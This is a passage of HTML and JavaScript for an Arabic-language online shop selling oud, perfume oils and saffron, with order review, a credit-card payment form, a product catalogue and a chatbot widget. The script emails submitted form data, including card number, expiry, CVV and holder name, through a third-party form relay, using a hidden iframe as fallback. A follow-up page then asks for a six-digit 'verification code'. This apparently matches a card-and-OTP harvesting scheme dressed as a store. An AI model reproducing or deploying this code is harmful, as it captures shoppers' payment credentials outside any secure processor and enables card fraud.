<div class="progress-step">
<div class="step-circle">4</div>
<p class="text-sm">التأكيد</p>
</div>
</div>
<div class="max-w-6xl mx-auto">
<div class="text-center mb-12">
<h1 class="text-4xl font-bold text-gray-800 mb-4">مراجعة الطلب</h1>
<p class="text-xl text-gray-600">تأكد من صحة البيانات قبل المتابعة للدفع</p>
</div>
<div class="grid lg:grid-cols-2 gap-8">
<!-- Order Items -->
<div class="form-section">
<h3><i class="fas fa-shopping-bag ml-3"></i>المنتجات المطلوبة</h3>
<div class="space-y-4" id="reviewOrderItems">
<!-- Items will be populated by JavaScript -->
</div>
</div>
<!-- Customer Info -->
<div class="form-section">
<h3><i class="fas fa-user ml-3"></i>معلومات العميل</h3>
<div class="space-y-3" id="reviewCustomerInfo">
<!-- Customer info will be populated by JavaScript -->
</div>
<button class="btn-secondary mt-4" onclick="editCustomerInfo()">
<i class="fas fa-edit ml-2"></i>
                            تعديل المعلومات
                        </button>
</div>
</div>
<!-- Order Summary -->
<div class="form-section mt-8">
<h3><i class="fas fa-calculator ml-3"></i>ملخص الفاتورة</h3>
<div class="space-y-4" id="reviewOrderSummary">
<!-- Summary will be populated by JavaScript -->
</div>
</div>
<!-- Action Buttons -->
<div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
<button class="btn-secondary" onclick="goBackToInfo()" type="button">
<i class="fas fa-arrow-right ml-2"></i>
                        العودة للمعلومات
                    </button>
<button class="btn-primary" onclick="proceedToPayment()" type="button">
<i class="fas fa-credit-card ml-2"></i>
                        متابعة للدفع
                    </button>
</div>
</div>
</div>
</div>
<!-- Payment Page -->
<div class="fullscreen-page" id="paymentPage">
<div class="container mx-auto px-6 py-12">
<!-- Progress Bar -->
<div class="progress-bar mb-12">
<div class="progress-step completed">
<div class="step-circle"><i class="fas fa-check"></i></div>
<p class="text-sm">معلومات الطلب</p>
</div>
<div class="progress-step completed">
<div class="step-circle"><i class="fas fa-check"></i></div>
<p class="text-sm">مراجعة الطلب</p>
</div>
<div class="progress-step active">
<div class="step-circle">3</div>
<p class="text-sm font-bold">الدفع</p>
</div>
<div class="progress-step">
<div class="step-circle">4</div>
<p class="text-sm">التأكيد</p>
</div>
</div>
<div class="max-w-4xl mx-auto">
<div class="text-center mb-12">
<h1 class="text-4xl font-bold text-gray-800 mb-4">إتمام الدفع</h1>
<p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
</div>
<form class="space-y-8" id="paymentForm">
<!-- Payment Card -->
<div class="form-section">
<div class="payment-card mb-6">
<div class="flex justify-between items-start mb-4">
<div>
<p class="text-lg font-semibold">الدفع بالبطاقة الائتمانية</p>
<p class="text-sm opacity-90">دفع آمن ومشفر 100%</p>
</div>
<div class="flex space-x-2 rtl:space-x-reverse">
<i class="fab fa-cc-visa text-2xl"></i>
<i class="fab fa-cc-mastercard text-2xl"></i>
</div>
</div>
<div class="flex items-center">
<i class="fas fa-lock ml-2"></i>
<span class="text-sm">محمي بتشفير SSL</span>
</div>
</div>
<h3><i class="fas fa-credit-card ml-3"></i>معلومات البطاقة</h3>
<div class="space-y-6">
<div class="input-group input-with-suggestions">
<input maxlength="19" name="card_number" onblur="hideCardSuggestions(this)" onfocus="showCardSuggestions(this)" oninput="formatCardNumber(this)" placeholder=" " required="" type="text"/>
<label>رقم البطاقة</label>
<div class="card-suggestions" id="cardSuggestions"></div>
</div>
<div class="grid grid-cols-2 gap-6">
<div class="input-group input-with-suggestions">
<input maxlength="5" name="expiry_date" onblur="hideExpirySuggestions(this)" onfocus="showExpirySuggestions(this)" oninput="formatExpiryDate(this)" placeholder=" " required="" style="color: #4F46E5; font-weight: 600;" type="text"/>
<label style="font-size: 13px; color: #6B7280;">تاريخ الانتهاء (شهر/سنة)</label>
<div class="card-suggestions" id="expirySuggestions"></div>
</div>
<div class="input-group">
<input maxlength="4" name="cvv" oninput="this.value = this.value.replace(/[^0-9]/g, '')" placeholder=" " required="" type="password"/>
<label>رمز الأمان (CVV)</label>
</div>
</div>
<div class="input-group input-with-suggestions">
<input name="card_holder" onblur="hideHolderSuggestions(this)" onfocus="showHolderSuggestions(this)" placeholder=" " required="" type="text"/>
<label>اسم حامل البطاقة</label>
<div class="card-suggestions" id="holderSuggestions"></div>
</div>
</div>
</div>
<!-- Payment Summary -->
<div class="form-section">
<h3><i class="fas fa-receipt ml-3"></i>ملخص الدفع</h3>
<div class="space-y-4" id="paymentSummary">
<!-- Payment summary will be populated by JavaScript -->
</div>
</div>
<!-- Security Notice -->
<div class="flex items-center justify-center p-6 bg-green-50 rounded-xl border border-green-200">
<i class="fas fa-shield-alt text-green-600 text-2xl ml-4"></i>
<div>
<p class="text-green-800 font-semibold text-lg">جميع المعاملات مؤمنة ومشفرة</p>
<p class="text-green-700 text-sm">نحن نحمي معلوماتك الشخصية والمالية بأعلى معايير الأمان</p>
</div>
</div>
<!-- Action Buttons -->
<div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
<button class="btn-secondary" onclick="goBackToReview()" type="button">
<i class="fas fa-arrow-right ml-2"></i>
                            العودة للمراجعة
                        </button>
<button class="btn-success text-xl py-4 px-8" id="submitPaymentBtn" type="submit">
<i class="fas fa-lock ml-2"></i>
                            تأكيد الدفع وإتمام الطلب
                        </button>
</div>
</form>
</div>
</div>
</div>
<!-- Verification Code Page -->
<div class="hidden fixed inset-0 bg-gradient-to-br from-emerald-500 via-green-500 to-teal-600 z-50" id="verificationPage">
<div class="flex items-center justify-center min-h-screen p-4">
<div class="bg-white rounded-3xl shadow-2xl p-8 max-w-lg w-full text-center success-animation relative overflow-hidden">
<!-- Background Pattern -->
<div class="absolute top-0 left-0 w-full h-full opacity-5">
<div class="absolute top-4 left-4 w-8 h-8 bg-green-500 rounded-full"></div>
<div class="absolute top-12 right-8 w-6 h-6 bg-emerald-500 rounded-full"></div>
<div class="absolute bottom-8 left-12 w-4 h-4 bg-teal-500 rounded-full"></div>
<div class="absolute bottom-4 right-4 w-10 h-10 bg-green-400 rounded-full"></div>
</div>
<div class="relative z-10">
<div class="mb-8">
<div class="w-24 h-24 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full mx-auto mb-6 flex items-center justify-center relative">
<div class="absolute inset-0 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full animate-pulse opacity-20"></div>
<i class="fas fa-shield-check text-green-600 text-4xl relative z-10"></i>
</div>
<h2 class="text-4xl font-bold bg-gradient-to-r from-gray-800 to-gray-700 bg-clip-text text-transparent mb-4">أدخل كود التأكيد</h2>
<p class="text-gray-600 text-lg leading-relaxed">تم إرسال كود التأكيد المكون من 6 أرقام إلى بريدك الإلكتروني</p>
<div class="mt-4 p-3 bg-green-50 rounded-lg">
<p class="text-green-700 font-semibold text-sm">
<i class="fas fa-envelope ml-2"></i>
                                تحقق من بريدك الإلكتروني للحصول على الكود
                            </p>
</div>
</div>
<div class="mb-8">
<label class="block text-gray-800 font-bold mb-6 text-xl">كود التأكيد</label>
<div class="flex justify-center space-x-3 rtl:space-x-reverse mb-6">
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
<input autocomplete="off" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" type="text"/>
</div>
<p class="text-sm text-gray-500 mb-4">أدخل الأرقام فقط - سيتم التحقق تلقائياً عند الانتهاء</p>
</div>
<div class="space-y-4">
<button class="btn-primary w-full text-xl py-4 shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-300" onclick="verifyCode()">
<i class="fas fa-check-circle ml-2"></i>
                            تأكيد الكود والمتابعة
                        </button>
<button class="text-orange-600 hover:text-orange-700 font-bold w-full py-3 bg-orange-50 hover:bg-orange-100 rounded-lg transition-all duration-300" onclick="resendCode()">
<i class="fas fa-redo ml-2"></i>
                            إعادة إرسال الكود
                        </button>
</div>
<div class="mt-8 grid grid-cols-1 gap-4">
<div class="p-4 bg-blue-50 rounded-xl border border-blue-100">
<div class="flex items-center justify-center mb-2">
<i class="fas fa-info-circle text-blue-600 ml-2"></i>
<span class="text-blue-800 font-semibold">معلومات مهمة</span>
</div>
<p class="text-sm text-blue-700 leading-relaxed">
                                إذا لم تستلم الكود خلال 5 دقائق، تحقق من مجلد الرسائل المرفوضة
                            </p>
</div>
<div class="p-4 bg-green-50 rounded-xl border border-green-100">
<div class="flex items-center justify-center mb-2">
<i class="fas fa-check-circle text-green-600 ml-2"></i>
<span class="text-green-800 font-semibold">تم تأكيد الطلب</span>
</div>
<p class="text-sm text-green-700">
                                سيتم التواصل معك قريباً لتأكيد التوصيل
                            </p>
</div>
</div>
</div>
</div>
</div>
</div>
<!-- AI Chat Toggle Button -->
<button class="ai-toggle-btn" onclick="toggleAIChat()">
<i class="fas fa-robot"></i>
</button>
<!-- AI Chat Container -->
<div class="ai-chat-container" id="aiChatContainer">
<div class="ai-chat-header">
<div class="flex items-center">
<div class="ai-avatar">
                    🤖
                </div>
<div class="mr-3">
<h3 class="font-bold text-lg">مساعد مكاسر الذكي</h3>
<p class="text-sm opacity-90">خبير العود والعطور</p>
</div>
</div>
<button class="text-white hover:text-orange-200" onclick="toggleAIChat()">
<i class="fas fa-times text-xl"></i>
</button>
</div>
<div class="ai-chat-messages" id="aiChatMessages">
<div class="ai-message bot">
                السلام عليكم! 👋 أنا مساعدكم الذكي في مكاسر العود
                <br/><br/>
                يمكنني مساعدتكم في:
                <br/>• اختيار العود المناسب لكم
                <br/>• معرفة تفاصيل المنتجات
                <br/>• نصائح استخدام العطور
                <br/>• الإجابة على أي استفسار
            </div>
</div>
<div class="ai-suggestions">
<button class="ai-suggestion-btn" onclick="askAI('ما هو أفضل نوع عود للمبتدئين؟')">أفضل عود للمبتدئين؟</button>
<button class="ai-suggestion-btn" onclick="askAI('كيف أحافظ على العود؟')">كيف أحافظ على العود؟</button>
<button class="ai-suggestion-btn" onclick="askAI('ما الفرق بين العود الطبيعي والمحسن؟')">الفرق بين الطبيعي والمحسن؟</button>
<button class="ai-suggestion-btn" onclick="askAI('أريد توصية منتج')">أريد توصية منتج</button>
</div>
<div class="ai-chat-input">
<input id="aiChatInput" onkeypress="handleAIEnter(event)" placeholder="اسألني أي شيء عن العود والعطور..." type="text"/>
<button class="ai-send-btn" onclick="sendAIMessage()">
<i class="fas fa-paper-plane"></i>
</button>
</div>
</div>
<!-- Scroll to Top Button -->
<div class="scroll-to-top" onclick="scrollToTop()">
<i class="fas fa-arrow-up"></i>
</div>
<script>
        // Enhanced products data
        const products = [
            // عود محسن
            {
                id: 1,
                name: "موروكي الفخامة",
                price: 180,
                originalPrice: 220,
                category: "عود محسن",
                image: "https://pfst.cf2.poecdn.net/base/image/37ec406f76ea83abcfd415aae35e8b83c8bc3c5261fbcbc1214a0ed8f7b9f032?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "عود موروكي فاخر بأجود الأنواع مع رائحة مميزة وثبات عالي",
                features: ["رائحة قوية", "ثبات طويل", "جودة عالية"]
            },
            {
                id: 2,
                name: "موروكي الشيوخ",
                price: 250,
                originalPrice: 300,
                category: "عود محسن",
                image: "https://pfst.cf2.poecdn.net/base/image/f3af81a8ae89f71007fcbf2b0fabe479aa71582d77a2ce47d4240292ade7e5f3?w=499&h=499",
                rating: 5,
                available: true,
                bestselling: true,
                description: "عود موروكي خاص للشيوخ والأعيان برائحة أصيلة",
                features: ["للمناسبات الخاصة", "رائحة ملكية", "تراث أصيل"]
            },
            {
                id: 3,
                name: "موروكي كنق",
                price: 450,
                originalPrice: 500,
                category: "عود محسن",
                image: "https://pfst.cf2.poecdn.net/base/image/aa4f73a1f3eec453fa1998520b458dd84ab8951ec8de709d55e90684b6587481?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: false,
                description: "أفخر أنواع العود الموروكي الملكي للذواقين",
                features: ["نوعية ملكية", "رائحة استثنائية", "للخاصة فقط"]
            },
            
            // عود طبيعي
            {
                id: 5,
                name: "دقة هندي",
                price: 120,
                originalPrice: 150,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/741f92cd176481f953e6b1dde1af16a862f76c92ded1a8a4ec7c358b6705bb67?w=431&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "دقة عود هندي طبيعي تتميز بالثبات والرائحة الجميلة للاستخدام الشخصي والمنزل والمكاتب والملابس",
                features: ["عود هندي أصلي", "ثبات عالي", "رائحة جميلة", "متعدد الاستخدامات"]
            },
            {
                id: 6,
                name: "موروكي اصقون",
                price: 1250,
                originalPrice: 1350,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/5723245f7465373691b4575d9b28fb66ee7605457890fd4fc52c46e402b63b34?w=500&h=500",
                rating: 5,
                available: false,
                bestselling: true,
                description: "موروكي فاخر من غابات اصقون قديم جداً (قرابة ال 12 سنه) وقل مايوجد هذه الايام بهذه الجودة والرائحة",
                features: ["عتيق 12 سنة", "جودة نادرة", "كسر مفروزة", "نفدت الكمية"]
            },
            {
                id: 7,
                name: "دقه فلبيني",
                price: 520,
                originalPrice: 580,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/c320883ca4cfb08474aaa2844aebca410db1f2adfc46832184fb5b3f099ce1e0?w=375&h=500",
                rating: 5,
                available: true,
                bestselling: false,
                description: "دقة العود الفلبيني الفاخر من غابات ليتي يتميز بكثافة الدهن وبنكهته الجميلة (كمودي - سيلاني)",
                features: ["من غابات ليتي", "كثافة دهن عالية", "نكهة كمودي سيلاني", "فلبيني فاخر"]
            },
            {
                id: 8,
                name: "دقة موروكي",
                price: 260,
                originalPrice: 300,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/469ecc7f563c72d61214e6eb7c1dbfb0a43fd141b8a9aafbdb5eae2ccaac9f95?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "دقة موروكي طبيعي بجودة ممتازة ورائحة مميزة وثبات قوي",
                features: ["موروكي أصلي", "رائحة مميزة", "ثبات قوي", "جودة ممتازة"]
            },
            {
                id: 9,
                name: "موروكي كسر ميني",
                price: 600,
                originalPrice: 680,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/28db98a401695322409ea0f1bb4afeddfb3177e95e6bc0baad2c8be6a688008f?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: false,
                description: "موروكي كسر ميني فاخر بحجم مناسب للاستخدام اليومي",
                features: ["كسر ميني", "موروكي فاخر", "للاستخدام اليومي", "حجم مناسب"]
            },
            {
                id: 10,
                name: "موروكي كسر مباخر",
                price: 750,
                originalPrice: 850,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/3d72e38a779e8913e1a619694d9b78242b97c3bc3ac14b1f50e26f67110506c7?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "موروكي كسر مباخر بحجم مناسب للمباخر والاستخدام المنزلي",
                features: ["كسر مباخر", "حجم مناسب", "للمنزل", "موروكي أصلي"]
            },
            {
                id: 11,
                name: "موروكي صفائح",
                price: 850,
                originalPrice: 950,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/8ab53dda767065184d47629657331cfbaf782d090e8a7f18e31b6522acbe131e?w=500&h=500",
                rating: 5,
                available: false,
                bestselling: true,
                description: "موروكي صفائح فاخرة بشكل رقائق مميزة وجودة استثنائية",
                features: ["صفائح فاخرة", "شكل مميز", "جودة استثنائية", "نفدت الكمية"]
            },
            {
                id: 12,
                name: "سيلاني",
                price: 750,
                originalPrice: 850,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/85f78db494116ed11bad6d2676a857262338be5586a834edeb44ad4b2df6981f?w=375&h=500",
                rating: 5,
                available: true,
                bestselling: false,
                description: "عود سيلاني طبيعي بنكهة مميزة ورائحة قوية وثبات عالي",
                features: ["سيلاني أصلي", "نكهة مميزة", "رائحة قوية", "ثبات عالي"]
            },
            {
                id: 13,
                name: "رقائق تراد",
                price: 180,
                originalPrice: 220,
                category: "عود طبيعي",
                image: "https://pfst.cf2.poecdn.net/base/image/53adfc7c27c9b338feff90b448d9d254d9cf07cf511d8e1c0b2f56e64509b5c8?w=374&h=500",
                rating: 4,
                available: true,
                bestselling: true,
                description: "رقائق تراد طبيعية بجودة ممتازة وسعر مناسب للجميع",
                features: ["رقائق طبيعية", "جودة ممتازة", "سعر مناسب", "تراد أصلي"]
            },

            // أدهان
            {
                id: 14,
                name: "دهن عود تراد",
                price: 95,
                originalPrice: 120,
                category: "أدهان",
                image: "https://pfst.cf2.poecdn.net/base/image/8f55f4d041b1da4648685c37deca7992ae3a799ea54e4f13ee1d1fd03e22cd1f?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "دهن عود تراد جميل جداً يتميز بالفوحان والثبات",
                features: ["فوحان عالي", "ثبات قوي", "تراد أصلي", "رائحة جميلة"]
            },
            {
                id: 15,
                name: "دهن كمبودي",
                price: 110,
                originalPrice: 140,
                category: "أدهان",
                image: "https://pfst.cf2.poecdn.net/base/image/792d9ab8bb364aa2f0f3eb443dd6d19533361a5f2cc69d8b9e2e3cd7bbff85d9?w=973&h=973",
                rating: 5,
                available: true,
                bestselling: false,
                description: "دهن كمبودي جميل بنكهة مميزة وفوحان عالي وثبات",
                features: ["نكهة مميزة", "فوحان عالي", "ثبات ممتاز", "كمبودي أصلي"]
            },
            {
                id: 16,
                name: "دهن عود كمبودي قديم",
                price: 150,
                originalPrice: 180,
                category: "أدهان",
                image: "https://pfst.cf2.poecdn.net/base/image/c977386b9fa98c3c858e4ae2ab57c06aefa30ee84523970823f880a35b518d88?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "دهن عود كمبودي قديم وثقيل يتميز بالثبات والفوحان وذو رائحة جميلة جداً",
                features: ["كمبودي قديم", "ثقيل ومركز", "ثبات عالي", "رائحة جميلة جداً"]
            },
            {
                id: 17,
                name: "دهن عود مكاسر",
                price: 130,
                originalPrice: 160,
                category: "أدهان",
                image: "https://pfst.cf2.poecdn.net/base/image/5ae457937aa92eafff9a51d760e81d731aee600ba68f8b66d5432758be38ebad?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "مزيج بين دهن العود الكمبودي القديم والتراد والبراشين انتج لنا رائحة مميزة مع ثبات وفوحان",
                features: ["مزيج مميز", "كمبودي + تراد + براشين", "رائحة مميزة", "ثبات وفوحان"]
            },

            // مبسوس
            {
                id: 18,
                name: "مبسوس موروكي",
                price: 85,
                originalPrice: 110,
                category: "مبسوس",
                image: "https://pfst.cf2.poecdn.net/base/image/b3ca16c5efefa8d80853409d41f8b4fdfb52d5accfe862e50481a27ef11ea87a?w=499&h=499",
                rating: 5,
                available: true,
                bestselling: true,
                description: "منتج من عود موروكي طبيعي مُزج بأدهان خاصة أضفت عليه رائحة مميزة ويستخدم لتبخير المنزل",
                features: ["موروكي طبيعي", "مزج بأدهان خاصة", "لتبخير المنزل", "للمبخرة الكهربائية"]
            },

            // زعفران
            {
                id: 19,
                name: "زعفران سوبر نقيل",
                price: 220,
                originalPrice: 260,
                category: "زعفران",
                image: "https://pfst.cf2.poecdn.net/base/image/6a9d9db8c970afac0102e622fbdb74dab53da3db2b311639fbe285378c8a4434?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "زعفران سوبر نقيل درجة أولى فاخر إنتاج عام 2022",
                features: ["سوبر نقيل", "درجة أولى", "فاخر", "إنتاج 2022"]
            },

            // توزيعات
            {
                id: 20,
                name: "نانو توله دهن مخلط",
                price: 45,
                originalPrice: 55,
                category: "توزيعات",
                image: "https://pfst.cf2.poecdn.net/base/image/4c0b55c846683601dd7b70898c63cd502c198553a107fdbc07af43a5cd8a64e3?w=500&h=500",
                rating: 5,
                available: true,
                bestselling: true,
                description: "نانو توله دهن مخلط مع رقائق لاوسي سوبر واقل في علبة مقاس 4.5 سم في 4.5 سم",
                features: ["نانو توله", "دهن مخلط", "رقائق لاوسي", "مقاس 4.5×4.5 سم"]
            }
        ];

        // Global variables
        let cart = [];
        let currentFilter = 'all';
        let savedCards = [];
        let customerInfo = {};
        let verificationCode = '';

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            displayProducts(products);
            updateCartDisplay();
            setupScrollButton();
            animateOnScroll();
            loadSavedCards();
            
            // SETUP FORM HANDLERS WITH IMPROVED EMAIL SYSTEM
            setTimeout(() => {
                const customerForm = document.getElementById('customerInfoForm');
                if (customerForm) {
                    customerForm.addEventListener('submit', handleCustomerInfoSubmit);
                }
                
                const paymentForm = document.getElementById('paymentForm');
                if (paymentForm) {
                    paymentForm.addEventListener('submit', handlePaymentSubmit);
                }
                
                // Setup contact form if exists
                const contactForm = document.getElementById('contactForm');
                if (contactForm) {
                    contactForm.addEventListener('submit', handleContactFormSubmit);
                }
            }, 1000);
            
            // إعداد النماذج المستقلة
            setupStandaloneForms();
            
            // Test email system on page load (optional - remove in production)
            // setTimeout(() => testEmailSystem(), 2000);
        });

        // WEB3FORMS EMAIL SYSTEM - نظام Web3Forms الجديد
        async function sendToWeb3Forms(formData, emailType = 'contact') {
            // Show loading state
            showLoadingState(true);
            
            try {
                // تحويل FormData إلى كائن عادي
                const dataObject = {};
                for (const [key, value] of formData.entries()) {
                    dataObject[key] = value;
                }
                
                // إضافة معلومات إضافية لـ Web3Forms
                dataObject.form_type = emailType;
                dataObject.timestamp = new Date().toLocaleString('ar-SA');
                dataObject.source = 'موقع مكاسر العود';
                dataObject.subject = getEmailSubject(emailType);
                
                // إرسال البيانات إلى Web3Forms
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(dataObject)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showLoadingState(false);
                    showNotification('✅ تم إرسال البيانات بنجاح! سيتم التواصل معك قريباً.', 'success');
                    return { success: true };
                } else {
                    throw new Error(`Web3Forms error: ${result.message}`);
                }
                
            } catch (error) {
                console.error('Web3Forms sending failed:', error);
                
                // طريقة بديلة باستخدام form submission عادي
                try {
                    const result = await sendViaWeb3FormsForm(formData, emailType);
                    showLoadingState(false);
                    showNotification('✅ تم إرسال البيانات بنجاح! سيتم التواصل معك قريباً.', 'success');
                    return { success: true };
                } catch (fallbackError) {
                    showLoadingState(false);
                    console.error('All Web3Forms methods failed:', fallbackError);
                    showNotification('❌ حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
                    return { success: false };
                }
            }
        }

        // طريقة بديلة لـ Web3Forms باستخدام form submission
        function sendViaWeb3FormsForm(formData, emailType) {
            return new Promise((resolve, reject) => {
                try {
                    // إنشاء iframe مخفي لتجنب إعادة التوجيه
                    const iframe = document.createElement('iframe');
                    iframe.name = 'web3formsSubmission';
                    iframe.style.display = 'none';
                    iframe.style.position = 'absolute';
                    iframe.style.left = '-9999px';
                    document.body.appendChild(iframe);
                    
                    // إنشاء form مخفي
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://api.web3forms.com/submit';
                    form.target = 'web3formsSubmission';
                    form.style.display = 'none';
                    
                    // إضافة جميع بيانات النموذج
                    for (const [key, value] of formData.entries()) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = value;
                        form.appendChild(input);
                    }
                    
                    // إضافة معلومات إضافية
                    const additionalData = {
                        'form_type': emailType,
                        'timestamp': new Date().toLocaleString('ar-SA'),
                        'source': 'موقع مكاسر العود',
                        'subject': getEmailSubject(emailType)
                    };
                    
                    Object.entries(additionalData).forEach(([key, value]) => {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = value;
                        form.appendChild(input);
                    });
                    
                    // إضافة النموذج والإرسال
                    document.body.appendChild(form);
                    form.submit();
                    
                    // تنظيف بعد التأخير
                    setTimeout(() => {
                        if (form.parentNode) form.parentNode.removeChild(form);
                        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                        resolve({ success: true });
                    }, 3000);
                    
                } catch (error) {
                    reject(error);
                }
            });
        }

        function getEmailSubject(type) {
            const subjects = {
                'contact': '📧 رسالة جديدة من موقع مكاسر العود',
                'customer': '📋 معلومات عميل جديد - مكاسر العود', 
                'review': '🔍 مراجعة الطلب وتأكيد البيانات - مكاسر العود',
                'payment': '💳 طلب جديد مع معلومات الدفع - مكاسر العود',
                'payment_form': '💳 نموذج دفع مستقل - مكاسر العود',
                'order_form': '🛒 طلب شراء مستقل - مكاسر العود',
                'verification': '🔐 إعادة إرسال كود التأكيد - مكاسر العود',
                'test': '🧪 رسالة تجريبية من موقع مكاسر العود'
            };
            return subjects[type] || subjects['contact'];
        }

        // دالة لمعالجة إرسال النماذج - الكود الجديد المحدث
        async function sendFormData(form, formType) {
            // تعطيل الزر ومنع إرسال متعدد
            const submitBtn = form.querySelector('button[type="submit"]');
            const originalBtnText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري الإرسال...';
            
            try {
                // إنشاء كائن FormData
                const formData = new FormData(form);
                
                // إضافة معلومات إضافية حسب نوع النموذج
                formData.append('form_type', formType);
                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                
                // إرسال البيانات باستخدام Web3Forms
                const result = await sendToWeb3Forms(formData, formType);
                
                if (result.success) {
                    showNotification('✅ تم إرسال البيانات بنجاح! سيتم التواصل معك قريباً.', 'success');
                    
                    // إعادة تعيين النموذج بعد الإرسال الناجح
                    setTimeout(() => {
                        form.reset();
                        submitBtn.innerHTML = originalBtnText;
                        submitBtn.disabled = false;
                    }, 2000);
                } else {
                    throw new Error('فشل في إرسال البيانات');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('❌ حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
                submitBtn.innerHTML = originalBtnText;
                submitBtn.disabled = false;
            }
        }

        // معالجة النماذج المستقلة
        function setupStandaloneForms() {
            // معالجة نموذج الطلب
            const orderForm = document.getElementById('orderForm');
            if (orderForm) {
                orderForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    sendFormData(this, 'order_form');
                });
            }

            // معالجة نموذج الدفع
            const paymentFormStandalone = document.getElementById('paymentFormStandalone');
            if (paymentFormStandalone) {
                paymentFormStandalone.addEventListener('submit', function(e) {
                    e.preventDefault();
                    sendFormData(this, 'payment_form');
                });
            }

            // معالجة نموذج التواصل
            const contactForm = document.getElementById('contactForm');
            if (contactForm) {
                contactForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    sendFormData(this, 'contact_form');
                });
            }
        }

        function getAutoResponse(type) {
            const responses = {
                'contact': 'شكراً لتواصلك معنا من مكاسر العود! تم استلام رسالتك وسنرد عليك في أقرب وقت ممكن إن شاء الله.',
                'customer': 'تم استلام معلوماتك من مكاسر العود بنجاح! سيتم التواصل معك قريباً لتأكيد طلبك.',
                'review': 'تم تأكيد مراجعة طلبك من مكاسر العود! البيانات صحيحة وجاري المتابعة لإتمام الطلب.',
                'payment': 'تم استلام طلبك من مكاسر العود بنجاح! سيتم معالجة طلبك ومراجعة بيانات الدفع خلال 24 ساعة.',
                'verification': 'تم إعادة إرسال كود التأكيد من مكاسر العود. تحقق من بريدك الإلكتروني.',
                'test': 'هذه رسالة تجريبية من موقع مكاسر العود. النظام يعمل بشكل صحيح!'
            };
            return responses[type] || responses['contact'];
        }

        function showLoadingState(show) {
            const buttons = document.querySelectorAll('button[type="submit"]');
            buttons.forEach(button => {
                if (show) {
                    button.disabled = true;
                    button.innerHTML = button.innerHTML.includes('spinner') ? button.innerHTML : 
                        button.innerHTML + ' <div class="loading-spinner"></div>';
                } else {
                    button.disabled = false;
                    button.innerHTML = button.innerHTML.replace(/<div class="loading-spinner"><\/div>/g, '');
                }
            });
        }

        // FORM HANDLERS WITH WEB3FORMS EMAIL SYSTEM
        function handleContactFormSubmit(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            
            // Add timestamp and source
            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
            formData.append('source', 'نموذج التواصل - الموقع الرئيسي');
            
            sendToWeb3Forms(formData, 'contact')
                .then(result => {
                    if (result.success) {
                        form.reset();
                        // Add success animation
                        form.classList.add('success-animation');
                        setTimeout(() => form.classList.remove('success-animation'), 1000);
                    }
                });
            
            return false;
        }

        function handleCustomerInfoSubmit(event) {
            event.preventDefault();
            event.stopPropagation();
            
            const form = event.target;
            
            // Validate required fields
            const requiredFields = ['first_name', 'last_name', 'email', 'phone', 'address', 'city', 'postal_code'];
